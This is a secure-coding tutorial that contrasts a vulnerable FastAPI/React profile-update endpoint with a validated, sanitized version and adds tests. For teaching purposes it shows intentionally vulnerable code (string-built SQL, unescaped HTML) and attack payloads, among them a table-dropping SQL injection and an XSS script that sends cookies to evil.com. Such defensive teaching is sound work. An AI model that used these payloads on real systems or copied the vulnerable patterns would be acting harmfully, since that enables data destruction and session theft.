# Input Validation Security Example

Real-world example demonstrating comprehensive input validation to prevent common security vulnerabilities.

## Scenario

Building a user profile update endpoint that's vulnerable to multiple injection attacks due to insufficient validation.

## Vulnerable Code

### Backend (FastAPI) - BEFORE

```python
# ❌ VULNERABLE CODE - DO NOT USE
from fastapi import FastAPI, HTTPException
from sqlalchemy import text

app = FastAPI()

@app.post("/api/users/{user_id}/profile")
async def update_profile(user_id: str, request: dict):
    """Update user profile - VULNERABLE VERSION"""

    # ❌ VULNERABILITY 1: No input validation
    name = request.get("name")
    bio = request.get("bio")
    website = request.get("website")
    age = request.get("age")

    # ❌ VULNERABILITY 2: SQL Injection via string concatenation
    query = text(f"""
        UPDATE users
        SET name = '{name}',
            bio = '{bio}',
            website = '{website}',
            age = {age}
        WHERE id = '{user_id}'
    """)

    await db.execute(query)

    return {"status": "success"}
```

**Attack Examples:**

1. **SQL Injection:**
   ```python
   POST /api/users/123/profile
   {
     "name": "'; DROP TABLE users; --",
     "bio": "innocent bio",
     "website": "https://example.com",
     "age": 25
   }
   # Executes: UPDATE users SET name = ''; DROP TABLE users; --', ...
   # Result: users table deleted!
   ```

2. **XSS via Bio Field:**
   ```python
   POST /api/users/123/profile
   {
     "name": "John",
     "bio": "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
     "website": "https://example.com",
     "age": 25
   }
   # Bio stored with script tag, executed when rendered
   ```

3. **Type Confusion:**
   ```python
   POST /api/users/123/profile
   {
     "name": "John",
     "bio": "Normal bio",
     "website": "javascript:alert('XSS')",  # Invalid URL scheme
     "age": "twenty"  # String instead of number - could crash
   }
   ```

### Frontend (TanStack Start) - BEFORE

```typescript
// ❌ VULNERABLE CODE - DO NOT USE
async function updateProfile(userId: string, data: any) {
  // ❌ VULNERABILITY: No client-side validation
  // ❌ VULNERABILITY: Trusting server data without sanitization

  const response = await fetch(`/api/users/${userId}/profile`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)  // No validation
  });

  return response.json();
}

function ProfileForm() {
  const [bio, setBio] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    await updateProfile(userId, { bio });  // No validation
  };

  return (
    <form onSubmit={handleSubmit}>
      <textarea value={bio} onChange={(e) => setBio(e.target.value)} />
      {/* ❌ VULNERABILITY: Rendering unescaped HTML */}
      <div dangerouslySetInnerHTML={{ __html: bio }} />
      <button type="submit">Save</button>
    </form>
  );
}
```

## Secure Code

### Step 1: Define Validation Schemas

**Frontend:** `src/schemas/user.ts`

```typescript
// ✅ SECURE: Comprehensive Zod schema
import { z } from 'zod';

export const updateProfileSchema = z.object({
  name: z
    .string()
    .min(1, 'Name is required')
    .max(100, 'Name must be less than 100 characters')
    .regex(/^[a-zA-Z\s'-]+$/, 'Name contains invalid characters')
    .transform(str => str.trim()), // Remove whitespace

  bio: z
    .string()
    .max(500, 'Bio must be less than 500 characters')
    .transform(str => str.trim())
    .optional(),

  website: z
    .string()
    .url('Invalid URL format')
    .refine(
      (url) => {
        // ✅ Only allow http/https schemes
        const parsed = new URL(url);
        return ['http:', 'https:'].includes(parsed.protocol);
      },
      { message: 'URL must use http or https protocol' }
    )
    .optional(),

  age: z
    .number()
    .int('Age must be an integer')
    .min(13, 'Must be at least 13 years old')
    .max(120, 'Invalid age')
    .optional()
});

export type UpdateProfileInput = z.infer<typeof updateProfileSchema>;
```

**Backend:** `app/schemas/user.py`

```python
# ✅ SECURE: Pydantic model with validation
from pydantic import BaseModel, Field, HttpUrl, validator
import re

class UpdateProfileRequest(BaseModel):
    name: str = Field(..., min_length=1, max_length=100)
    bio: str | None = Field(None, max_length=500)
    website: HttpUrl | None = None  # Pydantic validates URL format
    age: int | None = Field(None, ge=13, le=120)

    @validator('name')
    def validate_name(cls, v):
        """Only allow letters, spaces, hyphens, apostrophes"""
        if not re.match(r"^[a-zA-Z\s'\-]+$", v):
            raise ValueError('Name contains invalid characters')
        return v.strip()

    @validator('bio')
    def validate_bio(cls, v):
        """Strip HTML tags from bio"""
        if v:
            # Remove HTML tags (basic XSS prevention)
            v = re.sub(r'<[^>]*>', '', v)
            return v.strip()
        return v

    @validator('website')
    def validate_website(cls, v):
        """Ensure only http/https schemes"""
        if v and v.scheme not in ['http', 'https']:
            raise ValueError('URL must use http or https protocol')
        return v

    class Config:
        str_strip_whitespace = True  # Auto-trim strings
```

### Step 2: Secure Backend Implementation

```python
# ✅ SECURE CODE
from fastapi import FastAPI, HTTPException, Depends
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, update
from uuid import UUID
import bleach  # For HTML sanitization

from app.schemas.user import UpdateProfileRequest
from app.models.user import User
from app.db.session import get_session
from app.api.deps import get_current_user, verify_tenant_access

app = FastAPI()

@app.post("/api/users/{user_id}/profile")
async def update_profile(
    user_id: UUID,  # ✅ SECURITY: Type validation (must be valid UUID)
    data: UpdateProfileRequest,  # ✅ SECURITY: Pydantic validation
    current_user: User = Depends(get_current_user),  # ✅ SECURITY: Authentication
    session: AsyncSession = Depends(get_session)
):
    """Update user profile - SECURE VERSION"""

    # ✅ SECURITY: Authorization - users can only update their own profile
    if current_user.id != user_id:
        raise HTTPException(status_code=403, detail="Forbidden")

    # ✅ SECURITY: Verify user exists and belongs to correct tenant
    stmt = select(User).where(
        User.id == user_id,
        User.tenant_id == current_user.tenant_id  # ✅ SECURITY: Tenant isolation
    )
    result = await session.execute(stmt)
    user = result.scalar_one_or_none()

    if not user:
        raise HTTPException(status_code=404, detail="User not found")

    # ✅ SECURITY: Additional HTML sanitization for bio
    sanitized_bio = None
    if data.bio:
        sanitized_bio = bleach.clean(
            data.bio,
            tags=[],  # No HTML tags allowed
            strip=True
        )

    # ✅ SECURITY: Use ORM (prevents SQL injection)
    stmt = (
        update(User)
        .where(User.id == user_id)
        .values(
            name=data.name,
            bio=sanitized_bio,
            website=str(data.website) if data.website else None,
            age=data.age
        )
    )

    await session.execute(stmt)
    await session.commit()

    return {"status": "success"}
```

### Step 3: Secure Frontend Implementation

```typescript
// ✅ SECURE CODE
import { useState } from 'react';
import { z } from 'zod';
import DOMPurify from 'dompurify';  // For HTML sanitization
import { updateProfileSchema, type UpdateProfileInput } from '@/schemas/user';

async function updateProfile(userId: string, data: UpdateProfileInput) {
  // ✅ SECURITY: Client-side validation before sending
  const validated = updateProfileSchema.parse(data);

  const response = await fetch(`/api/users/${userId}/profile`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${getToken()}`  // ✅ SECURITY: Include auth token
    },
    body: JSON.stringify(validated)
  });

  if (!response.ok) {
    const error = await response.json();
    throw new Error(error.detail);
  }

  return response.json();
}

function ProfileForm() {
  const [formData, setFormData] = useState<Partial<UpdateProfileInput>>({
    name: '',
    bio: '',
    website: '',
    age: undefined
  });

  const [errors, setErrors] = useState<Record<string, string>>({});

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});

    try {
      // ✅ SECURITY: Validate before submission
      const validated = updateProfileSchema.parse(formData);
      await updateProfile(userId, validated);
      alert('Profile updated successfully');
    } catch (error) {
      if (error instanceof z.ZodError) {
        // Display validation errors
        const fieldErrors: Record<string, string> = {};
        error.errors.forEach((err) => {
          const field = err.path[0] as string;
          fieldErrors[field] = err.message;
        });
        setErrors(fieldErrors);
      } else {
        alert('Failed to update profile');
      }
    }
  };

  // ✅ SECURITY: Sanitize bio before rendering
  const sanitizedBio = DOMPurify.sanitize(formData.bio || '', {
    ALLOWED_TAGS: [],  // No HTML tags
    ALLOWED_ATTR: []
  });

  return (
    <form onSubmit={handleSubmit}>
      <div>
        <label htmlFor="name">Name</label>
        <input
          id="name"
          type="text"
          value={formData.name}
          onChange={(e) => setFormData({ ...formData, name: e.target.value })}
          maxLength={100}  // ✅ SECURITY: Client-side length limit
        />
        {errors.name && <span className="error">{errors.name}</span>}
      </div>

      <div>
        <label htmlFor="bio">Bio</label>
        <textarea
          id="bio"
          value={formData.bio}
          onChange={(e) => setFormData({ ...formData, bio: e.target.value })}
          maxLength={500}  // ✅ SECURITY: Client-side length limit
        />
        {errors.bio && <span className="error">{errors.bio}</span>}
      </div>

      <div>
        <label htmlFor="website">Website</label>
        <input
          id="website"
          type="url"  // ✅ SECURITY: Browser validation
          value={formData.website}
          onChange={(e) => setFormData({ ...formData, website: e.target.value })}
          placeholder="https://example.com"
        />
        {errors.website && <span className="error">{errors.website}</span>}
      </div>

      <div>
        <label htmlFor="age">Age</label>
        <input
          id="age"
          type="number"  // ✅ SECURITY: Browser validation
          value={formData.age}
          onChange={(e) => setFormData({
            ...formData,
            age: parseInt(e.target.value) || undefined
          })}
          min={13}
          max={120}
        />
        {errors.age && <span className="error">{errors.age}</span>}
      </div>

      {/* ✅ SECURITY: Render sanitized content as text (not HTML) */}
      <div>
        <h3>Bio Preview</h3>
        <p>{sanitizedBio}</p>  {/* Text rendering, not dangerouslySetInnerHTML */}
      </div>

      <button type="submit">Save Profile</button>
    </form>
  );
}
```

## Testing Validation

### Unit Tests (Frontend)

```typescript
// tests/schemas/user.test.ts
import { describe, test, expect } from 'vitest';
import { updateProfileSchema } from '@/schemas/user';

describe('updateProfileSchema', () => {
  test('validates correct input', () => {
    const valid = {
      name: 'John Doe',
      bio: 'Software engineer',
      website: 'https://example.com',
      age: 30
    };

    expect(() => updateProfileSchema.parse(valid)).not.toThrow();
  });

  test('rejects SQL injection in name', () => {
    const malicious = {
      name: "'; DROP TABLE users; --",
      bio: 'Bio',
      age: 30
    };

    expect(() => updateProfileSchema.parse(malicious)).toThrow('Name contains invalid characters');
  });

  test('rejects javascript: URL scheme', () => {
    const malicious = {
      name: 'John',
      website: 'javascript:alert("XSS")',
      age: 30
    };

    expect(() => updateProfileSchema.parse(malicious)).toThrow('URL must use http or https protocol');
  });

  test('rejects name > 100 characters', () => {
    const tooLong = {
      name: 'a'.repeat(101),
      age: 30
    };

    expect(() => updateProfileSchema.parse(tooLong)).toThrow('Name must be less than 100 characters');
  });

  test('rejects invalid age', () => {
    expect(() => updateProfileSchema.parse({ name: 'John', age: 12 }))
      .toThrow('Must be at least 13 years old');

    expect(() => updateProfileSchema.parse({ name: 'John', age: 150 }))
      .toThrow('Invalid age');
  });
});
```

### Integration Tests (Backend)

```python
# tests/test_profile.py
import pytest
from fastapi.testclient import TestClient

def test_update_profile_success(client: TestClient, auth_token: str):
    """Test successful profile update with valid data"""
    response = client.post(
        "/api/users/uuid-123/profile",
        headers={"Authorization": f"Bearer {auth_token}"},
        json={
            "name": "John Doe",
            "bio": "Software engineer",
            "website": "https://example.com",
            "age": 30
        }
    )

    assert response.status_code == 200
    assert response.json() == {"status": "success"}

def test_sql_injection_prevented(client: TestClient, auth_token: str):
    """Test that SQL injection is prevented"""
    response = client.post(
        "/api/users/uuid-123/profile",
        headers={"Authorization": f"Bearer {auth_token}"},
        json={
            "name": "'; DROP TABLE users; --",
            "age": 30
        }
    )

    assert response.status_code == 422  # Validation error
    assert "Name contains invalid characters" in response.text

def test_xss_sanitized(client: TestClient, auth_token: str):
    """Test that XSS attempts are sanitized"""
    response = client.post(
        "/api/users/uuid-123/profile",
        headers={"Authorization": f"Bearer {auth_token}"},
        json={
            "name": "John",
            "bio": "<script>alert('XSS')</script>",
            "age": 30
        }
    )

    assert response.status_code == 200

    # Verify bio is sanitized in database
    user = get_user("uuid-123")
    assert "<script>" not in user.bio  # HTML stripped

def test_unauthorized_update_blocked(client: TestClient, other_user_token: str):
    """Test that users cannot update other users' profiles"""
    response = client.post(
        "/api/users/uuid-OTHER/profile",
        headers={"Authorization": f"Bearer {other_user_token}"},
        json={"name": "Hacker", "age": 30}
    )

    assert response.status_code == 403
    assert response.json()["detail"] == "Forbidden"
```

## Security Checklist

- [x] **Input validation** on both client and server
- [x] **SQL injection prevention** (using ORM)
- [x] **XSS prevention** (HTML sanitization)
- [x] **Type validation** (Zod, Pydantic)
- [x] **Length limits** enforced
- [x] **URL scheme validation** (http/https only)
- [x] **Authentication** required
- [x] **Authorization** verified (own profile only)
- [x] **Tenant isolation** enforced
- [x] **Comprehensive tests** for security

## Key Takeaways

1. **Never trust client input** - Always validate on server
2. **Use ORMs** - Prevent SQL injection
3. **Sanitize HTML** - Prevent XSS
4. **Validate types** - Prevent type confusion
5. **Enforce limits** - Prevent DoS
6. **Test security** - Write tests for attack vectors

## Related Resources

- [Data Validation Checklist](../../data-quality/skills/data-validation/checklists/data-validation-checklist.md)
- [OWASP Input Validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [Zod Documentation](https://zod.dev)
- [Pydantic Documentation](https://docs.pydantic.dev)

---

**Vulnerabilities Prevented**: SQL Injection, XSS, Type Confusion
**Defense Layers**: Client validation + Server validation + Sanitization
**Impact**: Production security vulnerability → Secure implementation ✅
